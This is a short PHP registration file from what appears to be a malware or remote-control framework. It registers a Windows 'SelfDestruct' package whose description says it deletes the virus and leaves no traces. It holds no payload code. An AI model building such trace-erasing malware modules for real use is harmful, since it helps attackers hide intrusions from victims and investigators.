<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.oneTime.SelfDestruct", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SelfDestruct\\SelfDestruct", "easy.SelfDestruct", __DIR__, [Classes::WINDOWS_ALONE], "Deletes the virus permanently, leaving no traces left.");
